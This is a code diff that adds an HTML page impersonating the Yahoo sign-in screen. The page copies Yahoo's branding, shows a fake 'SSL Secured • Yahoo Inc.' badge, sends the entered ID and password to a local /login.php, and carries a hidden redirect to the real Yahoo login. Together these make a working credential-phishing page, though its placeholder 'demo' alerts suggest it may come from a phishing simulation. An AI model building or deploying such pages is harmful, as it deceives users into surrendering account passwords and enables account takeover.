@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #410093 0%, #5f01b0 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 440px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #410093;
+            font-size: 42px;
+            font-weight: 700;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 52px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #410093;
+            box-shadow: 0 0 0 3px rgba(65,0,147,0.1);
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: #410093;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #5f01b0;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0 20px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .remember-me input {
+            width: 18px;
+            height: 18px;
+            margin: 0;
+            accent-color: #410093;
+        }
+        
+        .remember-me label {
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .forgot-link {
+            color: #410093;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        
+        .divider::before {
+            margin-right: 12px;
+        }
+        
+        .divider::after {
+            margin-left: 12px;
+        }
+        
+        .create-link {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .create-link a {
+            color: #410093;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .create-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #410093;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #999;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .forgot-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>YAHOO!</h1>
+            <p>Sign in to your account</p>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://login.yahoo.com">
+                
+                <input type="text" name="username" placeholder="Yahoo ID (email)" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Keep me signed in</label>
+                    </div>
+                    <a href="#" class="forgot-link" onclick="alert('Forgot password demo'); return false;">Forgot ID or password?</a>
+                </div>
+                
+                <button type="submit">Next</button>
+            </form>
+            
+            <div class="divider">or</div>
+            
+            <div class="create-link">
+                <a href="#" onclick="alert('Create account demo'); return false;">Create a new Yahoo account</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>Yahoo Inc.</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            <a href="#" onclick="alert('Security demo'); return false;">Security</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please enter your Yahoo ID and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#410093';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#ccc';
+                }
+            });
+        });
+        
+        const rememberCheck = document.getElementById('remember');
+        rememberCheck.addEventListener('change', function() {
+            // Visual only
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.querySelector('input[name="username"]').focus();
+        });
+    </script>
+</body>
+</html>
